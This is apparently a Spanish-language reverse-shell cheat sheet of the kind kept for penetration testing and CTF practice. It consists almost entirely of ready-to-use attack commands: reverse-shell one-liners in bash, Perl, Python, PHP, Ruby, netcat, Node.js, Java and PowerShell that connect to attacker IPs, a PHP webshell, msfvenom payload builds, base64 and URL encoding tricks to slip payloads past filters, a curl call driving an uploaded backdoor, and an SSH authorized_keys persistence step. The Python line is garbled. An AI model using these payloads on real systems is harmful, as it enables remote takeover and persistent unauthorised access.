• Bash:

```
bash -i >& /dev/tcp/10.10.14.16/1234 0>&1
```

**!!NOTA IMPORTANTE!!**

	Si va en una URL es recomendable utilizar URL Encoding bash -c 'bash -i >& /dev/tcp/10.10.14.16/443 0>&1' -----> bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.16/443%200%3E%261%27

	También es importante en determinados casos ENCODEAR en base64

```
# Creación:
echo "bash -i >& /dev/tcp/10.10.14.38/1234 0>&1" | base64
# Ejecución:
echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zOC8xMjM0IDA+JjEK | base64 -d | bash
```

• Perl:

```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

• Python:

```
#OPCIÓN 1:
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.16",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

• PHP:
	* webshell

```
<?php system($_GET['cmd']); ?> 
```

	* One-liner

```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

	* Ficheros para subir:
	 Kali: usr/share/webshells/php/php-reverse-shell.php
	 Mejor opción: https://github.com/pentestmonkey/php-reverse-shell

	* Metasploit

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.php
```
 
* Ruby:

```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```


• Netcat:

```
# Linux:
nc -e /bin/sh <<IP>> <<LPORT>>
nc -e /bin/bash <<IP>> <<LPORT>>

# Windows
nc -e cmd <<IP>> <<LPORT>>

# Netcat (Wrong Version),suele funcionar
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

• JavaScript:

```
(function(){  
var net = require(“net”),  
cp = require(“child_process”),  
sh = cp.spawn(“/bin/bash”, []);  
var client = new net.Socket();  
client.connect(21, “192.168.49.248”, function(){  
client.pipe(sh.stdin);  
sh.stdout.pipe(client);  
sh.stderr.pipe(client);  
});  
return /a/;  
})();
```
• Java:


```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

• ASP (No Metasploit):

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f asp > shell.asp
```


• WAR (Sesión vía Netcat):

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f war > shell.war
```

• JSP (Sesión vía Netcat):

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.jsp
```

* Powershell One-Liner

```
PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

$EncodedText =[Convert]::ToBase64String($Bytes)

#Ejecución con curl

curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
```

* Si tenemos conexion a la maquina y SSH
```
echo "ssh-rsa <<id_rsa.pub>> > /home/pablo/.ssh/authorized_keys
```

#### Mas información
*  https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet